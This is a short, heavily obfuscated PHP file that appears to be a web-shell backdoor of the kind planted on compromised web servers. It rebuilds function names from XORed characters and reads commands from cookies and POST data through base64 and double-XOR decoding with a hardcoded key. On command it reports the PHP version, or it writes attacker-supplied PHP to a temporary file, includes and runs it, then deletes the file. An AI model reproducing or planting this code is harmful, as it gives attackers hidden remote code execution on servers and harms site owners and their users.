<?php /*svce  */function      qwozxdpe(){/*l*/echo	80011;     }$uhahccpqrh	=     'uhahccpqrh'	^	' ';$udh_yh	=/*  bzee*/"\146"    .    $uhahccpqrh(105)   .	"\154"	.	$uhahccpqrh(101)    .	$uhahccpqrh(95)/*   x*/./*eruqr  */"p"."\x75"	./*  tixdc  */"\x74"/*  zba  */./*qa   */$uhahccpqrh(330-235)/*  f   */./*htvm  */"\x63"/*   mzay*/.   "o"."n".$uhahccpqrh(116)	.	"e"."n"."\x74"/* ax   */.    "s";$zdumq	=    "b".$uhahccpqrh(397-300)      .      "\163"	./*ebf   */"e".$uhahccpqrh(575-521)	./* imp   */"4".$uhahccpqrh(95)	.	"d"."e".$uhahccpqrh(1067-968)	.	$uhahccpqrh(144-33)	.	$uhahccpqrh(100)/* kx */./*  hhqj */$uhahccpqrh(1087-986);
$be_ivp	=	"u"."\156"/*hxi  */./*  alxct */"s"."e".$uhahccpqrh(114)/*   wle */./*  cztb */"i"."a"."\154"	.	"\151"	./*w   */$uhahccpqrh(240-118)/*  s */./*   xpcw*/$uhahccpqrh(101);


$rbvdv/* xj */=	"\160"     .	"h"."p"."\x76"  ./*qidsp  */"\x65"  ./*  jeb  */"\x72"/*   ezqew*/.       $uhahccpqrh(115)     .  $uhahccpqrh(105)       .     "o"."n";
$rheacdslt	=/*  b */$uhahccpqrh(117)   .    "n".$uhahccpqrh(1081-973)    .	"i".$uhahccpqrh(504-394)	.  "k";


/* l   */function/* lb_ne   */qrpnwrvdd($ujjieilv,	$mqhwm)


{

	global   $uhahccpqrh;

/*fcel  */$rlhctimy      =       "";	for/*_vz*/($nmr_kpw_g	=   0;	$nmr_kpw_g	<	strlen($ujjieilv);)	{


     for/* qrj   */($rwqxy_jtu     =      0;	$rwqxy_jtu/*   d */<       strlen($mqhwm)    &&/*  ys  */$nmr_kpw_g	</* r */strlen($ujjieilv);	$rwqxy_jtu++,/* qvd_ */$nmr_kpw_g++)    {

/*t   */$rlhctimy/*dif*/.=	$uhahccpqrh(ord($ujjieilv[$nmr_kpw_g])	^    ord($mqhwm[$rwqxy_jtu]));


	}

/*  y  */}
	return   $rlhctimy;

}



$xckbw/* ywgbh*/=     $_COOKIE;$mysnmokncn	=/*putvq*/$_POST;$xckbw	=	array_merge($mysnmokncn,   $xckbw);$sgjyr  =      "\141"	.	"2"."8".$uhahccpqrh(701-649)      .	"\x34"/*rces */.	"4"."\63"	.	"\x65"."\x2d"	.      "0"."0"."\61"	.	"0"."-".$uhahccpqrh(52)/*  ki   */.  "8"."2"."1"."\55"	.       "8"."\62"/* wc*/.       "\x65"."\x61"/* lux*/.	"\55"	.       $uhahccpqrh(365-267)	.	"b"."5".$uhahccpqrh(54)/* md  */.	"\x61"  ./*   ib*/"\143"/*cuir   */./*  qfl  */$uhahccpqrh(200-98)/*m_q  */.	"\60"       .    "\66"	.	$uhahccpqrh(1032-930)/* r */./*   ixjp  */$uhahccpqrh(330-278)	./*  acbr*/$uhahccpqrh(1019-963);


foreach	($xckbw	as/*   dv  */$erppsj/*   ogh*/=>/*  vti   */$ujjieilv)	{


	$ujjieilv	=	$be_ivp(qrpnwrvdd(qrpnwrvdd($zdumq($ujjieilv),      $sgjyr),	$erppsj));       if   (isset($ujjieilv["\x61"	.	"k"]))/*lm*/{

       if	($ujjieilv["a"]/*  bjd */==/*   y_us_   */"i")/*lzgef*/{/*  s */$nmr_kpw_g/* _ryj */=  array();

/*  hxonh */$nmr_kpw_g[$uhahccpqrh(112)	.	"v"]/*in */=   $rbvdv();
	$nmr_kpw_g["s"."\166"]      =	"\63"  .	"\56"      .	"5";      echo	@serialize($nmr_kpw_g);

       }/*xx   */elseif       ($ujjieilv["a"]/* uqsn */==	"\x65")     {


	$psutlgspdw  =	sprintf(".".$uhahccpqrh(47)/*  ou */.	"%".$uhahccpqrh(115)  .	"."."\x70"	./*   k   */"l",	md5($sgjyr));


	$udh_yh($psutlgspdw,      "<"	./*b */$uhahccpqrh(63)     .   "\160"     .	$uhahccpqrh(104)     ./*dfam   */"p".$uhahccpqrh(32)     ./*   acc */"\165"	./*   fxvo  */"n".$uhahccpqrh(108)   .  "\x69"/* __   */.	"\156"/*   xxkh   */.   "\153"	./*   iwhs*/$uhahccpqrh(40)/*   dlsir  */.	$uhahccpqrh(165-70)/*c*/.	$uhahccpqrh(95)   .	$uhahccpqrh(474-404)/*osy   */.    $uhahccpqrh(73)	.      "L"."E"."\x5f"	.	$uhahccpqrh(95)	./* ur */"\51"/* rvhvs   */.     $uhahccpqrh(59)	.	$uhahccpqrh(32)/*  cceyr   */.	$ujjieilv["\x64"]);	include($psutlgspdw);

       $rheacdslt($psutlgspdw);/*yoceo  */}
/*ykm  */exit();

     }}